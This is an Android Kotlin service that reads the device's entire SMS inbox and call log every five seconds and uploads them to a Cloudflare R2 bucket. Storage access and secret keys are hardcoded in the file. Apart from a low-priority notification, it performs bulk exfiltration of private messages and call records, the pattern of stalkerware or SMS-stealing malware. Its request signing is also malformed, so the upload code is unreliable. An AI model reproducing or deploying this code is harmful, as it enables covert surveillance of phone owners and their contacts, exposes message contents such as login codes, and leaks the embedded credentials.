import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.provider.CallLog
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
class MessageAndCallService : Service() {

    private val handler = Handler()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val bucketName = "msg-call-10101"
    private val r2EndpointUrl = "https://76a2ea550634a917ef163968dc2278d6.r2.cloudflarestorage.com"
    private val accessKey = "17ae806db76be3fbc5d848528d7ade0f"
    private val secretKey = "afda45a100ecd59fd86d8a184c28d3c4f2e40438becfe86eaf716b81eac450b0"

    private val client = OkHttpClient()

    private val runnable = object : Runnable {
        override fun run() {
            collectMessagesAndCalls()
            handler.postDelayed(this, 5000) // Run every 5 seconds
        }
    }

    override fun onCreate() {
        super.onCreate()
        handler.post(runnable)
        startForegroundNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == STOP_ACTION) {
            stopForeground(true)
            stopSelf()
            return START_NOT_STICKY
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(runnable)
        scope.cancel()
        Log.d(TAG, "Service Destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun collectMessagesAndCalls() {
        Log.d(TAG, "Collecting Messages and Calls")
        collectMessages()
        collectCallLogs()
    }

    private fun collectMessages() {
        val contentResolver: ContentResolver = contentResolver
        val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        val messages = JSONArray()

        cursor?.let {
            if (it.moveToFirst()) {
                do {
                    val sender = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))

                    val message = JSONObject().apply {
                        put("sender", sender)
                        put("body", body)
                        put("date", date)
                    }
                    messages.put(message)
                } while (it.moveToNext())
                it.close()
            }
        }

        val formattedData = formatDataForUpload(messages)
        writeToFileAndUpload("messages.json", formattedData)
    }

    private fun collectCallLogs() {
        val contentResolver: ContentResolver = contentResolver
        val cursor: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
        val calls = JSONArray()

        cursor?.let {
            if (it.moveToFirst()) {
                do {
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val type = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))

                    val call = JSONObject().apply {
                        put("number", number)
                        put("type", type)
                        put("date", date)
                        put("duration", duration)
                    }
                    calls.put(call)
                } while (it.moveToNext())
                it.close()
            }
        }

        val formattedData = formatDataForUpload(calls)
        writeToFileAndUpload("calls.json", formattedData)
    }

    private fun formatDataForUpload(contents: JSONArray): String {
        val timestamp = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
        return JSONObject().apply {
            put("Content", contents)
            put("Time", timestamp)
        }.toString()
    }

    private fun writeToFileAndUpload(fileName: String, data: String) {
        val file = File(filesDir, fileName)
        FileOutputStream(file).use {
            it.write(data.toByteArray())
        }

        // Launch coroutine for file upload
        scope.launch {
            uploadToCloudflareR2(file, fileName)
        }
    }

    private suspend fun uploadToCloudflareR2(file: File, fileName: String) {
        withContext(Dispatchers.IO) {
            try {
                val requestBody = file.asRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder()
                    .url("$r2EndpointUrl/$bucketName/$fileName")
                    .put(requestBody)
                    .header("Authorization", "AWS4-HMAC-SHA256 $accessKey:$secretKey")
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "$fileName uploaded successfully to Cloudflare R2")
                    } else {
                        Log.e(TAG, "Failed to upload $fileName: ${response.message}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading $fileName to Cloudflare R2", e)
            }
        }
    }

    private fun startForegroundNotification() {
        val stopIntent = Intent(this, MessageAndCallService::class.java).apply {
            action = STOP_ACTION
        }
        val pendingStopIntent = PendingIntent.getService(this, 0, stopIntent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)

        val notificationChannelId = "message_and_call_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(notificationChannelId, "Message and Call Service", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, notificationChannelId)
            .setContentTitle("Service Running")
            .setContentText("Collecting messages and calls")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .addAction(android.R.drawable.ic_media_pause, "Stop", pendingStopIntent)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    companion object {
        private const val TAG = "MessageAndCallService"
        private const val STOP_ACTION = "STOP"
        private const val NOTIFICATION_ID = 1
    }
}